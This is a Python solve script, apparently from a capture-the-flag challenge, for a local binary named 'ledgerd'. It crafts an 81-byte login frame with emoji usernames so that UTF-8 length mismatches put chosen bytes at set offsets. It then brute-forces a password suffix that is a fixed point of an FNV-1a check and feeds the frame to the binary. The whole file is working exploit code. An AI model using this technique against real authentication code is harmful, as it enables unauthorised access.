#!/usr/bin/env python3
import subprocess
from pathlib import Path

BIN = Path('attachments/unpacked/bin/ledgerd').resolve()
user = '😀' * 15
pw_prefix = '😀😀𐀈BCZ'  # U+10008 ends in UTF-8 byte 0x88


def fnv1a(b):
    h = 0x811c9dc5
    for c in b:
        h = ((h ^ c) * 0x01000193) & 0xffffffff
    return h

for tweak in range(100):
    # Vary the username without changing its 60-byte encoded length.
    u = user if tweak == 0 else '😁' * (tweak % 15) + '😀' * (15 - tweak % 15)
    prefix = (u + '|' + pw_prefix).encode()
    assert len(prefix) == 76
    assert prefix[72:76] == bytes.fromhex('8842435a')
    h0 = fnv1a(prefix)
    for n in range(0x10000):
        suffix = f'{n:04x}'
        h = h0
        for c in suffix.encode():
            h = ((h ^ c) * 0x01000193) & 0xffffffff
        if (h & 0xffff) ^ 0x1998 == n:
            pw = pw_prefix + suffix
            frame = (u + '|' + pw + '\n').encode()
            assert len(u) <= 16 and len(pw) <= 16 and len(frame) == 81
            assert frame[72:76] == bytes.fromhex('8842435a')
            assert frame[76:80] == suffix.encode()
            print('user:', repr(u))
            print('pass:', repr(pw))
            print('hex suffix:', suffix)
            print('frame hex:', frame.hex())
            print('hash:', hex(h), 'low16^1998:', hex((h&0xffff)^0x1998))
            result = subprocess.run([str(BIN)], input=frame, capture_output=True)
            print(result.stdout.decode(errors='replace'))
            raise SystemExit
raise RuntimeError('No fixed point')
